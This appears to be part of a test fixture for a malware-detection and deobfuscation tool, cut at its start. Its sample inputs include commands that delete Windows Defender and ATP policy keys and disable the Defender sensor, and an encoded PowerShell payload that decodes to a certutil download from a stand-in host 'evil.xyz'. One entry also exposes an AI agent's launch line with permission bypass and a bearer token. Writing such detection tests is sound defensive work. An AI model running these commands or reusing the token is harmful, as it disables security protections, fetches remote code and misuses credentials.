'^(?i)-WhatIf:(\\\\$?false|0)$') \\{ $whatIf = $false; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:(\\\\$?true|1)$') \\{ $confirm = $true; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:(\\\\$?false|0)$') \\{ $confirm = $false; continue \\}\\\\n if ($arg -match '^(?i)-Force:$') \\{ $pendingSwitchMode = 'force'; continue \\}\\\\n if ($arg -match '^(?i)-Recurse:$') \\{ $pendingSwitchMode = 'recurse'; continue \\}\\\\n if ($arg -match '^(?i)-WhatIf:$') \\{ $pendingSwitchMode = 'whatif'; continue \\}\\\\n if ($arg -match '^(?i)-Confirm:$') \\{ $pendingSwitchMode = 'confirm'; continue \\}\\\\n\\\\n # \\u20165 \\u25903 \\u25345  rm \\u39118 \\u26684 \\u30701 \\u21442 \\u25968 \\u32452 \\u21512 \\u65306 -rf/-fr/-di \\u31561 \\\\n if ($arg -match '^-[fFrRdDiI]\\{2,\\}$') \\{\\\\n if ($arg -match '[fF]') \\{ $force = $true \\}\\\\n if ($arg -match '[rR]') \\{ $recursive = $true \\}\\\\n if ($arg -match '[dD]') \\{ $allowDir = $true \\}\\\\n if ($arg -match '[iI]') \\{ $interactive = $true \\}\\\\n continue\\\\n \\}\\\\n\\\\n if ($arg.StartsWith('-')) \\{\\\\n throw 'Remove-Item: unsupported option in safe-delete wrapper: ' + $arg\\\\n \\}\\\\n \\}\\\\n\\\\n $targetSpecs.Add([pscustomobject]@\\{ Value = $arg; IsLiteral = $false \\})\\\\n \\}\\\\n\\\\n if ($null -ne 'literal') \\{\\\\n throw 'Remove-Item: missing value for -Path/-LiteralPath'\\\\n \\}\\\\n if ($null -ne 'confirm') \\{\\\\n throw 'Remove-Item: missing boolean value for -' + 'confirm' + ':'\\\\n \\}\\\\n\\\\n if ($targetSpecs.Count -eq 0 -and $MyInvocation.ExpectingInput) \\{\\\\n $pipelinePathSeen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)\\\\n foreach ($pipedItem in $input) \\{\\\\n if ($null -eq $pipedItem) \\{ continue \\}\\\\n\\\\n $candidatePath = ''\\\\n if ($pipedItem -is [string]) \\{\\\\n $candidatePath = [string]$pipedItem\\\\n \\} elseif ($pipedItem -is [System.IO.FileSystemInfo]) \\{\\\\n $candidatePath = [string]$pipedItem.FullName\\\\n \\} elseif ($pipedItem -is [System.Management.Automation.PathInfo]) \\{\\\\n $candidatePath = [string]$pipedItem.Path\\\\n \\} elseif ($pipedItem.PSObject.Properties['FullName']) \\{\\\\n $candidatePath = [string]$pipedItem.FullName\\\\n \\} elseif ($pipedItem.PSObject.Properties['Path']) \\{\\\\n $candidatePath = [string]$pipedItem.Path\\\\n \\} else \\{\\\\n $candidatePath = [string]$pipedItem\\\\n \\}\\\\n\\\\n if (-not [string]::IsNullOrWhiteSpace($candidatePath) -and $pipelinePathSeen.Add($candidatePath)) \\{\\\\n $targetSpecs.Add([pscustomobject]@\\{\\\\n Value = $candidatePath\\\\n IsLiteral = $true\\\\n \\})\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\\\n if ($interactive) \\{\\\\n throw (New-SafeDeleteFailClosedMessage '' 'interactive-not-supported')\\\\n \\}\\\\n\\\\n if ($targetSpecs.Count -eq 0) \\{\\\\n throw 'Remove-Item: missing path operand'\\\\n \\}\\\\n\\\\n $trashBin = $env:CODEBUDDY_SAFE_DELETE_TRASH_BIN\\\\n if (-not $trashBin -and $env:GENIE_TRASH_DIR) \\{\\\\n $arch = if (($env:PROCESSOR_ARCHITECTURE -as [string]) -match 'ARM64') \\{ 'arm64' \\} else \\{ 'x64' \\}\\\\n $trashBin = Join-Path -Path $env:GENIE_TRASH_DIR -ChildPath ('win32-' + $arch + '.exe')\\\\n \\}\\\\n\\\\n $safeDeleteTargets = New-Object System.Collections.Generic.List[string]\\\\n $safeDeleteItems = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($targetSpec in $targetSpecs) \\{\\\\n if ($targetSpec.IsLiteral) \\{\\\\n $resolvedItems = @(Microsoft.PowerShell.Management\\\\Resolve-Path -LiteralPath $targetSpec.Value -ErrorAction SilentlyContinue)\\\\n \\} else \\{\\\\n $resolvedItems = @(Microsoft.PowerShell.Management\\\\Resolve-Path -Path $targetSpec.Value -ErrorAction SilentlyContinue)\\\\n \\}\\\\n\\\\n if ($resolvedItems.Count -eq 0) \\{\\\\n if ($force) \\{ continue \\}\\\\n throw (New-SafeDeleteFailClosedMessage $targetSpec.Value 'path-not-found')\\\\n \\}\\\\n\\\\n foreach ($resolved in $resolvedItems) \\{\\\\n $resolvedPath = [string]$resolved.Path\\\\n $providerName = [string]$resolved.Provider.Name\\\\n\\\\n # \\u20165 \\u23545  FileSystem \\u36208  safe-delete\\u65307 \\u20854 \\u20182  provider \\u36879 \\u20256 \\u20869 \\u32622  Remove-Item\\\\n if ($providerName -ne 'FileSystem' -or $whatIf) \\{\\\\n $delegateArgs = @\\{\\\\n LiteralPath = $resolvedPath\\\\n ErrorAction = 'Stop'\\\\n \\}\\\\n if ($force) \\{ $delegateArgs['Force'] = $true \\}\\\\n if ($recursive) \\{ $delegateArgs['Recurse'] = $true \\}\\\\n if ($whatIf) \\{ $delegateArgs['WhatIf'] = $true \\}\\\\n if ($confirm) \\{ $delegateArgs['Confirm'] = $true \\}\\\\n Microsoft.PowerShell.Management\\\\Remove-Item @delegateArgs\\\\n continue\\\\n \\}\\\\n\\\\n $isDir = Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath -PathType Container\\\\n $safeDeleteTargets.Add($resolvedPath)\\\\n $safeDeleteItems.Add([pscustomobject]@\\{\\\\n TargetSpec = $targetSpec.Value\\\\n ResolvedPath = $resolvedPath\\\\n IsDir = $isDir\\\\n \\})\\\\n \\}\\\\n \\}\\\\n\\\\n $guardedSafeDeleteTargets = New-Object System.Collections.Generic.List[string]\\\\n $guardedSafeDeleteItems = New-Object System.Collections.Generic.List[object]\\\\n\\\\n foreach ($item in $safeDeleteItems) \\{\\\\n $resolvedPath = [string]$item.ResolvedPath\\\\n\\\\n if (Test-SafeDeleteUnderOsTemp $resolvedPath) \\{\\\\n $tmpDelegateArgs = @\\{\\\\n LiteralPath = $resolvedPath\\\\n ErrorAction = 'Stop'\\\\n \\}\\\\n if ($force) \\{ $tmpDelegateArgs['Force'] = $true \\}\\\\n if ($recursive) \\{ $tmpDelegateArgs['Recurse'] = $true \\}\\\\n Microsoft.PowerShell.Management\\\\Remove-Item @tmpDelegateArgs\\\\n continue\\\\n \\}\\\\n\\\\n $guardedSafeDeleteTargets.Add($resolvedPath)\\\\n $guardedSafeDeleteItems.Add($item)\\\\n \\}\\\\n\\\\n Invoke-SafeDeleteBulkGuard -Targets $guardedSafeDeleteTargets.ToArray()\\\\n\\\\n foreach ($item in $guardedSafeDeleteItems) \\{\\\\n $targetValue = [string]$item.TargetSpec\\\\n $resolvedPath = [string]$item.ResolvedPath\\\\n $isDir = [bool]$item.IsDir\\\\n\\\\n try \\{\\\\n if ($confirm) \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'confirm-not-supported')\\\\n \\}\\\\n\\\\n if ($isDir -and -not $recursive -and -not $allowDir) \\{\\\\n $children = @(Microsoft.PowerShell.Management\\\\Get-ChildItem -LiteralPath $resolvedPath -Force -ErrorAction Stop)\\\\n if ($children.Count -gt 0) \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'non-empty-directory')\\\\n \\}\\\\n \\}\\\\n\\\\n $movedByBinary = $false\\\\n if ($trashBin -and (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $trashBin -PathType Leaf)) \\{\\\\n & $trashBin $resolvedPath *> $null\\\\n if (($LASTEXITCODE -eq 0) -and -not (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath)) \\{\\\\n $movedByBinary = $true\\\\n \\}\\\\n \\}\\\\n\\\\n if (-not $movedByBinary) \\{\\\\n if ($isDir) \\{\\\\n [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteDirectory(\\\\n $resolvedPath,\\\\n [Microsoft.VisualBasic.FileIO.UIOption]::OnlyErrorDialogs,\\\\n [Microsoft.VisualBasic.FileIO.RecycleOption]::SendToRecycleBin\\\\n )\\\\n \\} else \\{\\\\n [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile(\\\\n $resolvedPath,\\\\n [Microsoft.VisualBasic.FileIO.UIOption]::OnlyErrorDialogs,\\\\n [Microsoft.VisualBasic.FileIO.RecycleOption]::SendToRecycleBin\\\\n )\\\\n \\}\\\\n \\}\\\\n\\\\n if (Microsoft.PowerShell.Management\\\\Test-Path -LiteralPath $resolvedPath) \\{\\\\n throw 'target still exists after recycle operation: ' + $resolvedPath\\\\n \\}\\\\n Write-SafeDeleteReport $resolvedPath\\\\n \\} catch \\{\\\\n throw (New-SafeDeleteFailClosedMessage $targetValue 'trash-failed' $_.Exception.Message)\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\\\n foreach ($aliasName in @('ri', 'rm', 'del', 'erase', 'rmdir', 'unlink')) \\{\\\\n try \\{\\\\n Set-Alias -Name $aliasName -Value Remove-Item -Scope Global -Force -ErrorAction Stop\\\\n \\} catch \\{\\\\n # Built-in alias may have AllScope; ignore and keep existing mapping.\\\\n \\}\\\\n \\}\\\\n\\}\\\\n$outFile = \\\\\\\\\"E:\\\\workbuddy folder\\\\2026-07-09-21-00-45\\\\monitor_check_3.txt\\\\\\\\\"\\\\n$content = @()\\\\n\\\\n# === 4. Startup Programs ===\\\\n$content += \\\\\\\\\"========== 4. Startup Programs ==========\\\\\\\\\"\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n\\\\n# From registry Run keys\\\\n$runKeys = @(\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKLM:\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\",\\\\n \\\\\\\\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\\\\\",\\\\n \\\\\\\\\"HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\\\\\\"\\\\n)\\\\n\\\\n$content += \\\\\\\\\"--- Registry Run Keys ---\\\\\\\\\"\\\\nforeach ($key in $runKeys) \\{\\\\n if (Test-Path $key) \\{\\\\n $props = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue\\\\n if ($props) \\{\\\\n $props.PSObject.Properties | Where-Object \\{ $_.Name -notlike \\\\\\\\\"PS*\\\\\\\\\" \\} | ForEach-Object \\{\\\\n $content += \\\\\\\\\" [$key]\\\\\\\\\"\\\\n $content += \\\\\\\\\" $($_.Name) = $($_.Value)\\\\\\\\\"\\\\n $content += \\\\\\\\\"\\\\\\\\\"\\\\n \\}\\\\n \\}\\\\n \\}\\\\n\\}\\\\n\\\\n# From Startup folder\\\\n$content += \\\\\\\\\"--- Startup Folder ---\\\\\\\\\"\\\\n$startupFolders = @(\\\\n \\\\\\\\\"$env:APPDATA\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\\\\\",\\\\n \\\\\\\\\"$env:ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\\\\\"\\\\n)\\\\nforeach ($folder in $startupFolders) \\{\\\\n if (Test-Path $folder) \\{\\\\n $files = Get-ChildItem -Path $folder -ErrorAction SilentlyContinue\\\\n if ($files) \\{\\\\n foreach ($f in $files) \\{\\\\n $content += \\\\\\\\\" $($f.FullName)\\\\\\\\\"\\\\n \\}\\\\n \\} else \\{\\\\n $content += \\\\\\\\\" (empty) $folder\\\\\\\\\"\\\\n \\}\\\\n \\} else \\{\\\\n $content += \\\\\\\\\" (not found) $folder\\\\\\\\\"\\\\n \\}\\\\n\\}\\\\n\\\\n# Scheduled tasks that might be monitoring\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n$content += \\\\\\\\\"========== 5. Scheduled Tasks (Non-Microsoft) ==========\\\\\\\\\"\\\\n$content += \\\\\\\\\"\\\\\\\\\"\\\\n$tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object \\{ \\\\n $_.State -ne \\\\\\\\\"Disabled\\\\\\\\\" -and $_.TaskPath -notlike \\\\\\\\\"\\\\Microsoft\\\\*\\\\\\\\\" \\\\n\\}\\\\nif ($tasks) \\{\\\\n $tasks | ForEach-Object \\{\\\\n $content += \\\\\\\\\" Task: $($_.TaskName)\\\\\\\\\"\\\\n $content += \\\\\\\\\" Path: $($_.TaskPath)\\\\\\\\\"\\\\n $content += \\\\\\\\\" State: $($_.State)\\\\\\\\\"\\\\n $actions = $_.Actions | ForEach-Object \\{ $_.Execute \\}\\\\n $content += \\\\\\\\\" Action: $($actions -join '; ')\\\\\\\\\"\\\\n $content += \\\\\\\\\"\\\\\\\\\"\\\\n \\}\\\\n\\} else \\{\\\\n $content += \\\\\\\\\" No non-Microsoft scheduled tasks found.\\\\\\\\\"\\\\n\\}\\\\n\\\\n$content | Out-File -FilePath $outFile -Encoding UTF8\\\\nWrite-Output \\\\\\\\\"Part 3 done\\\\\\\\\"\\\\\", /UAC:230BE0 /NCRC /S /UPDATE=1, -NoProfile -ExecutionPolicy Bypass -File \\\\\"E:\\\\workbuddy folder\\\\2026-07-09-21-00-45\\\\system_cleanup.ps1\\\\\", --config \\\\\"\\{\\\\\\\\\"extraPath\\\\\\\\\":[\\\\\\\\\"F:\\\\\\\\WorkBuddy\\\\\\\\resources\\\\\\\\app.asar.unpacked\\\\\\\\cli\\\\\\\\bin\\\\\\\\runtime\\\\\\\\git\\\\\\\\bin\\\\\\\\\",\\\\\\\\\"C:\\\\\\\\Users\\\\\\\\Administrator\\\\\\\\.workbuddy\\\\\\\\vendor\\\\\\\\PortableGit\\\\\\\\bin\\\\\\\\\"],\\\\\\\\\"enableGlobalProjection\\\\\\\\\":false,\\\\\\\\\"ipcAddress\\\\\\\\\":\\\\\\\\\"WorkBuddy_6b81854b8f92a5f1\\\\\\\\\"\\}\\\\\" --app_home C:\\\\Users\\\\Administrator\\\\.workbuddy, query HKCU\\\\Software\\\\WorkBuddy /v DownloadChannel, config Sense start= disabled, -secured -Embedding, F:\\\\WorkBuddy\\\\resources\\\\app.asar.unpacked\\\\cli\\\\bin\\\\codebuddy --serve --session-id f2ec4686-95f8-4271-988d-8d224fa40068 --permission-mode bypassPermissions --permission-mode-before-plan bypassPermissions --allowedTools read_me show_widget connect_cloud_service read_netdrive_file read_netdrive_image list_netdrive_folder save_netdrive_file WebFetch --model auto --tools Read,Write,Edit,MultiEdit,Glob,Grep,Bash,PowerShell,TaskCreate,TaskGet,TaskUpdate,TaskList,TaskStop,TaskOutput,WebFetch,WebSearch,Skill,SkillManage,AskUserQuestion,LSP,ImageGen,VideoGen,Agent,TeamCreate,TeamDelete,SendMessage,ToolSearch,DeferExecuteTool,read_netdrive_file,read_netdrive_image,list_netdrive_folder,save_netdrive_file,EnterPlanMode,ExitPlanMode,ListMcpResources,ReadMcpResource --system-prompt-file C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\workbuddy-prompts\\\\f2ec4686-95f8-4271-988d-8d224fa40068.prompt.txt --settings \\\\\"\\{\\\\\\\\\"trustedDirectories\\\\\\\\\":[\\\\\\\\\"E:\\\\\\\\workbuddy folder\\\\\\\\2026-07-09-21-00-45/**\\\\\\\\\"],\\\\\\\\\"language\\\\\\\\\":\\\\\\\\\"\\u31616 \\u20307 \\u20013 \\u25991 \\\\\\\\\"\\}\\\\\" --mcp-config \\\\\"\\{\\\\\\\\\"mcpServers\\\\\\\\\":\\{\\\\\\\\\"connector-proxy\\\\\\\\\":\\{\\\\\\\\\"type\\\\\\\\\":\\\\\\\\\"http\\\\\\\\\",\\\\\\\\\"url\\\\\\\\\":\\\\\\\\\"http://127.0.0.1:40492/mcp\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true,\\\\\\\\\"tools\\\\\\\\\":\\{\\\\\\\\\"present_files\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"connect_cloud_service\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"automation_update\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"read_me\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"show_widget\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"conversation_search\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"workbuddy_cloudstudio_deploy\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":false\\},\\\\\\\\\"workbuddy_marketplace_skill\\\\\\\\\":\\{\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_batch_edit\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_batch_read\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_locate_available_space\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_editor_state\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_file_info\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_guidelines\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_capture_screenshot\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_variables\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_apply_variables\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_capture_layout\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_style_guide\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_fetch_style_guide_tags\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_export_nodes\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_scan_exportable_resources\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_upload_images\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_open_design\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_create_design\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"ardot_save_tokens\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"ardot\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"read_netdrive_file\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"read_netdrive_image\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"list_netdrive_folder\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\},\\\\\\\\\"save_netdrive_file\\\\\\\\\":\\{\\\\\\\\\"server_name\\\\\\\\\":\\\\\\\\\"netdrive\\\\\\\\\",\\\\\\\\\"defer_loading\\\\\\\\\":true\\}\\},\\\\\\\\\"transparent_proxy\\\\\\\\\":true,\\\\\\\\\"builtin_tools\\\\\\\\\":[\\\\\\\\\"present_files\\\\\\\\\",\\\\\\\\\"connect_cloud_service\\\\\\\\\",\\\\\\\\\"automation_update\\\\\\\\\",\\\\\\\\\"read_me\\\\\\\\\",\\\\\\\\\"show_widget\\\\\\\\\",\\\\\\\\\"conversation_search\\\\\\\\\",\\\\\\\\\"workbuddy_cloudstudio_deploy\\\\\\\\\",\\\\\\\\\"connect_cloud_service\\\\\\\\\",\\\\\\\\\"workbuddy_marketplace_skill\\\\\\\\\"],\\\\\\\\\"headers\\\\\\\\\":\\{\\\\\\\\\"Authorization\\\\\\\\\":\\\\\\\\\"Bearer UJjhOMXIiexIthelm6_2UcPMg0g2ujxWutO14MSBnZY\\\\\\\\\",\\\\\\\\\"X-WorkBuddy-Session-Id\\\\\\\\\":\\\\\\\\\"f2ec4686-95f8-4271-988d-8d224fa40068\\\\\\\\\",\\\\\\\\\"X-WorkBuddy-Welcome-Mode\\\\\\\\\":\\\\\\\\\"working\\\\\\\\\"\\}\\}\\}\\}\\\\\" --strict-mcp-config --port 40589, delete \\\\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Advanced Threat Protection\\\\\" /f, delete \\\\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\\" /f}",
+    "post_proc": {}
+  },
+  {
+    "name": "New1",
+    "input": "powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcOTM4XDk2eFw1NnhcNTN4XDg2eFxlNnhcYzR4XDM3eFxjNnhcZDZ4XDQ2eFxjNnhcOTN4XDk3eFxjNHhcMjR4XGU0eFw0NXhcYTR4XDc3eFwyNXhcODR4XDQ2eFxmNnhcMjR4XGE2eFxkNHhcYzZ4XDk1eFw3NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFwwM3hcYzZ4XDc0eFwyNnhcNzd4XGU0eFw4NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFxjNnhcODZ4XDIzeFw5NXhcODZ4XGU0eFw3NHhcMjZ4XDk3eFw2NXhcODV4XGM0eFw3N3hcOTR4XDQ1eFxhNHhcYzZ4XDg2eFw4NXhcYTV4XDU3eFw3N3hcNzV4XDE2eFwwM3hcNjV4XDg0eFw0NnhcOTd4XDY1eFwyM3hcOTV4XDk3eFw5NHhcNDV4XGE0eFw3N3hcOTR4XDQ1eFxhNHhcYTZ4XDkzeFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYjZ4XDEzeFwyM3hcOTV4XA==",
+    "input_len": 1130,
+    "engine": "archetype:PS_EncodedCommand+PS_HEXFAMILY_UNIFIED_OBFUSCATION+CERTUTIL_DOWNLOAD_DECODE_WORKFLOW",
+    "chain": [
+      "extract-b64",
+      "utf16le-or-utf8-decode",
+      "hexfamily-detect",
+      "hexfamily-unmap",
+      "hex-decode",
+      "base64-decode",
+      "utf16le-or-utf8-decode",
+      "certutil-annotate"
+    ],
+    "score": 100,
+    "verdict": "Malicious",
+    "mitre": [
+      "T1059.001",
+      "T1027.010",
+      "T1059.003",
+      "T1105",
+      "T1027"
+    ],
+    "lolbins": [
+      "certutil.exe",
+      "powershell.exe",
+      "cmd.exe"
+    ],
+    "iocs": {
+      "urls": [
+        "http://evil.xyz+X["
+      ],
+      "ips": [],
+      "domains": [
+        "evil.xyz",
+        "evil.xyz+x["
+      ],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "output": "# --- Certutil LOLBAS Workflow Detected ---\n# T1105 \u00b7 Ingress Tool Transfer (certutil -urlcache)\ncmd.exe /c \"certutil.exe -urlcache -split -f http://evil.xyz+X[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL\ufffd\tL\ufffdU\u0011ST\tL\ufffdIMP\ufffdX[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL\ufffd\tL\ufffd\ufffdL\ufffd\ufffdL\ufffd\tL\ufffdU\u0011ST\tL\ufffdIMP\ufffdX[\u001d\ufffd\\\ufffdK\ufffd^\u0019IL",
+    "post_proc": {}
+  },
+  {
+    "name": "Error1",
+    "input": "powershell.exe -e ZDN4XGQzeFw3NnhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcOTZ4XGU0eFw5N3hcNTV4XDk2eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcZTR4XDU1eFxlNHhcYzZ4XDU1eFxhNnhcZDR4XGM2eFwxNHhcNjV4XDQ1eFw2NHhcMjV4XDY1eFxlNHhcOTd4XDU1eFwzNHhcZDR4XDk3eFw1NXhcMzV4XGE1eFw0M3hcNjV4XGQ2eFxjNHhcYzZ4XGE0eFw4NXhcOTV4XDMzeFw4N3hcNzV4XDk1eFw0N3hcOTM4XDk2eFw1NnhcNTN4XDg2eFxlNnhcYzR4XDM3eFxjNnhcZDZ4XDQ2eFxjNnhcOTN4XDk3eFxjNHhcMjR4XGU0eFw0NXhcYTR4XDc3eFwyNXhcODR4XDQ2eFxmNnhcMjR4XGE2eFxkNHhcYzZ4XDk1eFw3NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFwwM3hcYzZ4XDc0eFwyNnhcNzd4XGU0eFw4NXhcYzR4XDc3eFw5NHhcNDV4XGE0eFxjNnhcODZ4XDIzeFw5NXhcODZ4XGU0eFw3NHhcMjZ4XDk3eFw2NXhcODV4XGM0eFw3N3hcOTR4XDQ1eFxhNHhcYzZ4XDg2eFw4NXhcYTV4XDU3eFw3N3hcNzV4XDE2eFwwM3hcNjV4XDg0eFw0NnhcOTd4XDY1eFwyM3hcOTV4XDk3eFw5NHhcNDV4XGE0eFw3N3hcOTR4XDQ1eFxhNHhcYTZ4XDkzeFwzNHh